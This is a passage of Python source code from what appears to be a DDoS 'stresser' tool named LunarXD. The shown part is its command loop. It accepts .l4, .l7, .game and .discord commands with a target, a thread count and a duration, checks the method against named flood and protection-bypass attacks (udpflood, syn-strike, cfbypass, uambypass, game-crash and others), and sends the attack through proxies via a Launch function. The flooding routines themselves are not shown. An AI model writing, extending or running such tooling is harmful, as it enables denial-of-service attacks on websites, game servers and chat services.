                if method not in ["udpflood", "tcpflood", "dns", "udp-kill", "icmp-blast", "syn-strike"]:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L4 method. Use 'methods' to see available options."))
                    continue
                proxy_type = int(proxy_ver)
                Launch(method, target, threads, duration, proxy_type, port)
            except ValueError:
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Threads and duration must be numbers."))

        elif command.startswith(".l7"):
            try:
                parts = command.split()
                if len(parts) < 5:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .l7 <method> <url> <threads> <duration> [port]"))
                    continue
                method = parts[1].lower()
                url = parts[2]
                threads = int(parts[3])
                duration = int(parts[4])
                port = int(parts[5]) if len(parts) > 5 else None
                if method not in ["cc", "post", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer"]:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid L7 method. Use 'methods' to see available options."))
                    continue
                proxy_type = int(proxy_ver)
                Launch(method, url, threads, duration, proxy_type, port)
            except ValueError:
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Threads and duration must be numbers."))

        elif command.startswith(".game"):
            try:
                parts = command.split()
                if len(parts) < 5:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .game <method> <ip>[:port] <threads> <duration> [port]"))
                    continue
                method = parts[1].lower()
                target = parts[2]
                threads = int(parts[3])
                duration = int(parts[4])
                port = int(parts[5]) if len(parts) > 5 else None
                if method not in ["game-crash", "lobby-flood"]:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid game method. Use 'methods' to see available options."))
                    continue
                proxy_type = int(proxy_ver)
                Launch(method, target, threads, duration, proxy_type, port)
            except ValueError:
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Threads and duration must be numbers."))

        elif command.startswith(".discord"):
            try:
                parts = command.split()
                if len(parts) < 4:
                    clearcs()
                    print(Colorate.Horizontal(Colors.cyan_to_blue, "> Usage: .discord <link> <threads> <duration> [port]"))
                    continue
                method = "discord"
                link = parts[1]
                threads = int(parts[2])
                duration = int(parts[3])
                port = int(parts[4]) if len(parts) > 4 else None
                proxy_type = int(proxy_ver)
                Launch(method, link, threads, duration, proxy_type, port)
            except ValueError:
                clearcs()
                print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid input. Threads and duration must be numbers."))

        elif command == "exit":
            clearcs()
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Exiting LunarXD..."))
            sys.exit(0)

        elif command == "menu":
            clearcs()
            bannerm()

        else:
            clearcs()
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Unknown command. Type 'help' for a list of commands."))

if __name__ == "__main__":
    main()
